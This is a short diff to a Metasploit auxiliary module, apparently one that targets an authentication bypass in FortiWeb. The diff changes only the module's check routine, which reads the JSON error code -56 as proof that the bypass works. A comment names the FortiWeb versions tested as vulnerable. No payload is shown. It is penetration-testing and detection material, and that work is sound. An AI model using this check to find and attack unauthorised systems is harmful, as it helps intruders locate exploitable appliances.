@@ -70,11 +70,18 @@ class MetasploitModule < Msf::Auxiliary
   def check
     res = post_auth_bypass_request({ data: {} })
 
-    return CheckCode::Unknown('Connection failed') unless res
+    return Exploit::CheckCode::Unknown('Connection failed') unless res
 
     return Exploit::CheckCode::Safe('Received a 403 Forbidden response') if res.code == 403
 
-    Exploit::CheckCode::Appears
+    j = JSON.parse(res.body)
+
+    # Tested against vulnerable FortiWeb versions 8.0.1, 7.4.8, 6.4.3, and 6.3.9
+    return Exploit::CheckCode::Appears('Authentication bypass succeeded on FortiWeb') if j.dig('results', 'errcode') == -56
+
+    Exploit::CheckCode::Unknown('Unexpected JSON results')
+  rescue JSON::ParserError
+    return Exploit::CheckCode::Unknown('Failed to parse JSON body')
   end
 
   def run
